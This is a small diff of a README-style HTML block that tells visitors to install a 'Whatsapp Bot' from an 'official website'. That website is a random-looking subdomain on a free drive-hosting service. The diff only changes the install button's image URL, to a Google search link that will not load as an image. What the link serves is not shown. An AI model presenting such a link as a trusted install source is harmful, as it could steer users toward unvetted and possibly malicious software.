@@ -17,7 +17,7 @@
 <div align="center">
 	<h1>Visit our official website to install the Whatsapp Bot :</h1>
 	<a href="https://xzuospdrllsqzzztwyooeq-on.drv.tw/Amdibell/site%20file">
-<img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Ficon-library.com%2Finstall-png" width="400"></br></a>
+<img src="https://www.google.com/searchq=install+icon+png&tbm=isch&hl=en&chips=q:install+icon+png,online_chips:iconexperience:Pjs5rn0YMxU%3D&sa=X&ved=2ahUKEwjA9ry9gOXzAhW-itgFHVc6Du4Q4lYoD3oECAEQLg&biw=1263&bih=892#imgrc=wOs7xxu5JnDH5M.png" width="400"></br></a>
 </div>	
 	
 	
